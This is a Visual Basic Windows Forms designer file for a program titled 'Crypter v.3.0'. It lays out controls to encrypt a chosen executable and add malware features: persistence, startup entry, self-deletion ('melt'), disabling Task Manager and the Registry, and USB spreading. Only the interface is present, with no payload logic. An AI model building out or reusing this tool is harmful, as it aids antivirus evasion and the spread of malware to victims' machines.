﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.txtFile = New System.Windows.Forms.TextBox()
        Me.txtIcon = New System.Windows.Forms.TextBox()
        Me.btFile = New System.Windows.Forms.Button()
        Me.btIcon = New System.Windows.Forms.Button()
        Me.pbIcon = New System.Windows.Forms.PictureBox()
        Me.gbBrowse = New System.Windows.Forms.GroupBox()
        Me.chkDelay = New System.Windows.Forms.CheckBox()
        Me.txtDelay = New System.Windows.Forms.TextBox()
        Me.lblDelay = New System.Windows.Forms.Label()
        Me.gbEncr = New System.Windows.Forms.GroupBox()
        Me.btKeyGen = New System.Windows.Forms.Button()
        Me.cbEnc = New System.Windows.Forms.ComboBox()
        Me.txtRanKey = New System.Windows.Forms.TextBox()
        Me.gbOption = New System.Windows.Forms.GroupBox()
        Me.chkUSB = New System.Windows.Forms.CheckBox()
        Me.chkRegistry = New System.Windows.Forms.CheckBox()
        Me.chkTaskMgr = New System.Windows.Forms.CheckBox()
        Me.chkStartup = New System.Windows.Forms.CheckBox()
        Me.chkMelt = New System.Windows.Forms.CheckBox()
        Me.chkPersis = New System.Windows.Forms.CheckBox()
        Me.btCrypt = New System.Windows.Forms.Button()
        Me.ToolTip1 = New System.Windows.Forms.ToolTip(Me.components)
        Me.pbar1 = New System.Windows.Forms.ProgressBar()
        CType(Me.pbIcon, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.gbBrowse.SuspendLayout()
        Me.gbEncr.SuspendLayout()
        Me.gbOption.SuspendLayout()
        Me.SuspendLayout()
        '
        'txtFile
        '
        Me.txtFile.BackColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(255, Byte), Integer), CType(CType(192, Byte), Integer))
        Me.txtFile.ForeColor = System.Drawing.Color.Black
        Me.txtFile.Location = New System.Drawing.Point(16, 28)
        Me.txtFile.Name = "txtFile"
        Me.txtFile.ReadOnly = True
        Me.txtFile.Size = New System.Drawing.Size(296, 21)
        Me.txtFile.TabIndex = 0
        Me.txtFile.Text = "FILE..."
        '
        'txtIcon
        '
        Me.txtIcon.BackColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(255, Byte), Integer), CType(CType(192, Byte), Integer))
        Me.txtIcon.ForeColor = System.Drawing.Color.Black
        Me.txtIcon.Location = New System.Drawing.Point(16, 63)
        Me.txtIcon.Name = "txtIcon"
        Me.txtIcon.ReadOnly = True
        Me.txtIcon.Size = New System.Drawing.Size(296, 21)
        Me.txtIcon.TabIndex = 1
        Me.txtIcon.Text = "ICON (OPTIONAL)"
        '
        'btFile
        '
        Me.btFile.Location = New System.Drawing.Point(328, 26)
        Me.btFile.Name = "btFile"
        Me.btFile.Size = New System.Drawing.Size(100, 23)
        Me.btFile.TabIndex = 2
        Me.btFile.Text = "BROWSE"
        Me.ToolTip1.SetToolTip(Me.btFile, "Browse for file to be crypted (Alt+F)")
        Me.btFile.UseVisualStyleBackColor = True
        '
        'btIcon
        '
        Me.btIcon.Location = New System.Drawing.Point(328, 61)
        Me.btIcon.Name = "btIcon"
        Me.btIcon.Size = New System.Drawing.Size(100, 23)
        Me.btIcon.TabIndex = 3
        Me.btIcon.Text = "BROWSE"
        Me.ToolTip1.SetToolTip(Me.btIcon, "Browse to select Icon for file (Alt+I)")
        Me.btIcon.UseVisualStyleBackColor = True
        '
        'pbIcon
        '
        Me.pbIcon.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.pbIcon.Location = New System.Drawing.Point(446, 15)
        Me.pbIcon.Name = "pbIcon"
        Me.pbIcon.Size = New System.Drawing.Size(87, 77)
        Me.pbIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.pbIcon.TabIndex = 4
        Me.pbIcon.TabStop = False
        Me.ToolTip1.SetToolTip(Me.pbIcon, "Your selected Icon")
        '
        'gbBrowse
        '
        Me.gbBrowse.Controls.Add(Me.txtFile)
        Me.gbBrowse.Controls.Add(Me.btIcon)
        Me.gbBrowse.Controls.Add(Me.pbIcon)
        Me.gbBrowse.Controls.Add(Me.txtIcon)
        Me.gbBrowse.Controls.Add(Me.btFile)
        Me.gbBrowse.Font = New System.Drawing.Font("Franklin Gothic Medium", 9.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.gbBrowse.Location = New System.Drawing.Point(6, 7)
        Me.gbBrowse.Name = "gbBrowse"
        Me.gbBrowse.Size = New System.Drawing.Size(546, 100)
        Me.gbBrowse.TabIndex = 5
        Me.gbBrowse.TabStop = False
        Me.gbBrowse.Text = "FILE SELECTION"
        '
        'chkDelay
        '
        Me.chkDelay.AutoSize = True
        Me.chkDelay.Font = New System.Drawing.Font("Franklin Gothic Medium", 9.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.chkDelay.Location = New System.Drawing.Point(12, 124)
        Me.chkDelay.Name = "chkDelay"
        Me.chkDelay.Size = New System.Drawing.Size(152, 20)
        Me.chkDelay.TabIndex = 6
        Me.chkDelay.Text = "DELAYED EXECUTION"
        Me.ToolTip1.SetToolTip(Me.chkDelay, "Delay execution of your file(in sec.) (D)")
        Me.chkDelay.UseVisualStyleBackColor = True
        '
        'txtDelay
        '
        Me.txtDelay.Font = New System.Drawing.Font("Franklin Gothic Medium", 9.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtDelay.Location = New System.Drawing.Point(30, 147)
        Me.txtDelay.MaxLength = 2
        Me.txtDelay.Name = "txtDelay"
        Me.txtDelay.Size = New System.Drawing.Size(41, 21)
        Me.txtDelay.TabIndex = 7
        Me.ToolTip1.SetToolTip(Me.txtDelay, "Enter delay time other than '0'")
        '
        'lblDelay
        '
        Me.lblDelay.AutoSize = True
        Me.lblDelay.Font = New System.Drawing.Font("Franklin Gothic Medium", 9.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblDelay.Location = New System.Drawing.Point(73, 152)
        Me.lblDelay.Name = "lblDelay"
        Me.lblDelay.Size = New System.Drawing.Size(34, 16)
        Me.lblDelay.TabIndex = 8
        Me.lblDelay.Text = "Sec."
        '
        'gbEncr
        '
        Me.gbEncr.Controls.Add(Me.btKeyGen)
        Me.gbEncr.Controls.Add(Me.cbEnc)
        Me.gbEncr.Controls.Add(Me.txtRanKey)
        Me.gbEncr.Font = New System.Drawing.Font("Franklin Gothic Medium", 9.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.gbEncr.Location = New System.Drawing.Point(206, 111)
        Me.gbEncr.Name = "gbEncr"
        Me.gbEncr.Size = New System.Drawing.Size(346, 75)
        Me.gbEncr.TabIndex = 9
        Me.gbEncr.TabStop = False
        Me.gbEncr.Text = "ENCRYPTION"
        '
        'btKeyGen
        '
        Me.btKeyGen.Location = New System.Drawing.Point(30, 17)
        Me.btKeyGen.Name = "btKeyGen"
        Me.btKeyGen.Size = New System.Drawing.Size(144, 23)
        Me.btKeyGen.TabIndex = 5
        Me.btKeyGen.Text = "GENERATE KEY"
        Me.ToolTip1.SetToolTip(Me.btKeyGen, "Generate random key for Encryption (G)")
        Me.btKeyGen.UseVisualStyleBackColor = True
        '
        'cbEnc
        '
        Me.cbEnc.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.cbEnc.FormattingEnabled = True
        Me.cbEnc.Items.AddRange(New Object() {"DES", "AES", "TDES", "XOR", "PolyAES"})
        Me.cbEnc.Location = New System.Drawing.Point(212, 16)
        Me.cbEnc.Name = "cbEnc"
        Me.cbEnc.Size = New System.Drawing.Size(121, 24)
        Me.cbEnc.TabIndex = 10
        Me.ToolTip1.SetToolTip(Me.cbEnc, "Select the type of Encryption")
        '
        'txtRanKey
        '
        Me.txtRanKey.BackColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(192, Byte), Integer))
        Me.txtRanKey.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtRanKey.ForeColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(192, Byte), Integer))
        Me.txtRanKey.Location = New System.Drawing.Point(6, 46)
        Me.txtRanKey.Name = "txtRanKey"
        Me.txtRanKey.ReadOnly = True
        Me.txtRanKey.Size = New System.Drawing.Size(334, 21)
        Me.txtRanKey.TabIndex = 0
        Me.txtRanKey.Text = "Look for tool-tip for shortcuts"
        '
        'gbOption
        '
        Me.gbOption.Controls.Add(Me.chkUSB)
        Me.gbOption.Controls.Add(Me.chkRegistry)
        Me.gbOption.Controls.Add(Me.chkTaskMgr)
        Me.gbOption.Controls.Add(Me.chkStartup)
        Me.gbOption.Controls.Add(Me.chkMelt)
        Me.gbOption.Controls.Add(Me.chkPersis)
        Me.gbOption.Font = New System.Drawing.Font("Franklin Gothic Medium", 9.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.gbOption.Location = New System.Drawing.Point(12, 189)
        Me.gbOption.Name = "gbOption"
        Me.gbOption.Size = New System.Drawing.Size(332, 70)
        Me.gbOption.TabIndex = 10
        Me.gbOption.TabStop = False
        Me.gbOption.Text = "OPTIONS"
        '
        'chkUSB
        '
        Me.chkUSB.AutoSize = True
        Me.chkUSB.Location = New System.Drawing.Point(268, 42)
        Me.chkUSB.Name = "chkUSB"
        Me.chkUSB.Size = New System.Drawing.Size(51, 20)
        Me.chkUSB.TabIndex = 17
        Me.chkUSB.Text = "USB"
        Me.ToolTip1.SetToolTip(Me.chkUSB, "Spread through USB (U)")
        Me.chkUSB.UseVisualStyleBackColor = True
        '
        'chkRegistry
        '
        Me.chkRegistry.AutoSize = True
        Me.chkRegistry.Location = New System.Drawing.Point(133, 42)
        Me.chkRegistry.Name = "chkRegistry"
        Me.chkRegistry.Size = New System.Drawing.Size(116, 20)
        Me.chkRegistry.TabIndex = 15
        Me.chkRegistry.Text = "DIS. REGISTRY"
        Me.ToolTip1.SetToolTip(Me.chkRegistry, "Disable Registry (R)")
        Me.chkRegistry.UseVisualStyleBackColor = True
        '
        'chkTaskMgr
        '
        Me.chkTaskMgr.AutoSize = True
        Me.chkTaskMgr.Location = New System.Drawing.Point(12, 42)
        Me.chkTaskMgr.Name = "chkTaskMgr"
        Me.chkTaskMgr.Size = New System.Drawing.Size(115, 20)
        Me.chkTaskMgr.TabIndex = 13
        Me.chkTaskMgr.Text = "DIS. TASKMGR"
        Me.ToolTip1.SetToolTip(Me.chkTaskMgr, "Disable Task Manager (T)")
        Me.chkTaskMgr.UseVisualStyleBackColor = True
        '
        'chkStartup
        '
        Me.chkStartup.AutoSize = True
        Me.chkStartup.Location = New System.Drawing.Point(133, 19)
        Me.chkStartup.Name = "chkStartup"
        Me.chkStartup.Size = New System.Drawing.Size(129, 20)
        Me.chkStartup.TabIndex = 11
        Me.chkStartup.Text = "ADD TO STARTUP"
        Me.ToolTip1.SetToolTip(Me.chkStartup, "Add the file to Windows Startup (S)")
        Me.chkStartup.UseVisualStyleBackColor = True
        '
        'chkMelt
        '
        Me.chkMelt.AutoSize = True
        Me.chkMelt.Location = New System.Drawing.Point(268, 19)
        Me.chkMelt.Name = "chkMelt"
        Me.chkMelt.Size = New System.Drawing.Size(58, 20)
        Me.chkMelt.TabIndex = 1
        Me.chkMelt.Text = "MELT"
        Me.ToolTip1.SetToolTip(Me.chkMelt, "Delete the file after execution (M)")
        Me.chkMelt.UseVisualStyleBackColor = True
        '
        'chkPersis
        '
        Me.chkPersis.AutoSize = True
        Me.chkPersis.Location = New System.Drawing.Point(12, 19)
        Me.chkPersis.Name = "chkPersis"
        Me.chkPersis.Size = New System.Drawing.Size(109, 20)
        Me.chkPersis.TabIndex = 0
        Me.chkPersis.Text = "PERSISTANCE"
        Me.ToolTip1.SetToolTip(Me.chkPersis, "Check if you want your file to be kill proof (P)")
        Me.chkPersis.UseVisualStyleBackColor = True
        '
        'btCrypt
        '
        Me.btCrypt.BackColor = System.Drawing.Color.Lime
        Me.btCrypt.Font = New System.Drawing.Font("Franklin Gothic Medium", 18.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btCrypt.Location = New System.Drawing.Point(377, 197)
        Me.btCrypt.Name = "btCrypt"
        Me.btCrypt.Size = New System.Drawing.Size(157, 34)
        Me.btCrypt.TabIndex = 5
        Me.btCrypt.Text = "C R Y P T !"
        Me.ToolTip1.SetToolTip(Me.btCrypt, "Crypt your File.")
        Me.btCrypt.UseVisualStyleBackColor = False
        '
        'pbar1
        '
        Me.pbar1.Location = New System.Drawing.Point(361, 236)
        Me.pbar1.Name = "pbar1"
        Me.pbar1.Size = New System.Drawing.Size(191, 23)
        Me.pbar1.TabIndex = 11
        '
        'Form1
        '
        Me.AcceptButton = Me.btCrypt
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(564, 269)
        Me.Controls.Add(Me.pbar1)
        Me.Controls.Add(Me.btCrypt)
        Me.Controls.Add(Me.gbOption)
        Me.Controls.Add(Me.gbEncr)
        Me.Controls.Add(Me.lblDelay)
        Me.Controls.Add(Me.txtDelay)
        Me.Controls.Add(Me.chkDelay)
        Me.Controls.Add(Me.gbBrowse)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.Fixed3D
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.KeyPreview = True
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Form1"
        Me.Opacity = 0.9R
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Crypter v.3.0"
        CType(Me.pbIcon, System.ComponentModel.ISupportInitialize).EndInit()
        Me.gbBrowse.ResumeLayout(False)
        Me.gbBrowse.PerformLayout()
        Me.gbEncr.ResumeLayout(False)
        Me.gbEncr.PerformLayout()
        Me.gbOption.ResumeLayout(False)
        Me.gbOption.PerformLayout()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents txtFile As System.Windows.Forms.TextBox
    Friend WithEvents txtIcon As System.Windows.Forms.TextBox
    Friend WithEvents btFile As System.Windows.Forms.Button
    Friend WithEvents btIcon As System.Windows.Forms.Button
    Friend WithEvents pbIcon As System.Windows.Forms.PictureBox
    Friend WithEvents gbBrowse As System.Windows.Forms.GroupBox
    Friend WithEvents chkDelay As System.Windows.Forms.CheckBox
    Friend WithEvents txtDelay As System.Windows.Forms.TextBox
    Friend WithEvents lblDelay As System.Windows.Forms.Label
    Friend WithEvents gbEncr As System.Windows.Forms.GroupBox
    Friend WithEvents btKeyGen As System.Windows.Forms.Button
    Friend WithEvents cbEnc As System.Windows.Forms.ComboBox
    Friend WithEvents txtRanKey As System.Windows.Forms.TextBox
    Friend WithEvents gbOption As System.Windows.Forms.GroupBox
    Friend WithEvents chkRegistry As System.Windows.Forms.CheckBox
    Friend WithEvents chkTaskMgr As System.Windows.Forms.CheckBox
    Friend WithEvents chkStartup As System.Windows.Forms.CheckBox
    Friend WithEvents chkMelt As System.Windows.Forms.CheckBox
    Friend WithEvents chkPersis As System.Windows.Forms.CheckBox
    Friend WithEvents btCrypt As System.Windows.Forms.Button
    Friend WithEvents ToolTip1 As System.Windows.Forms.ToolTip
    Friend WithEvents chkUSB As System.Windows.Forms.CheckBox
    Friend WithEvents pbar1 As System.Windows.Forms.ProgressBar

End Class
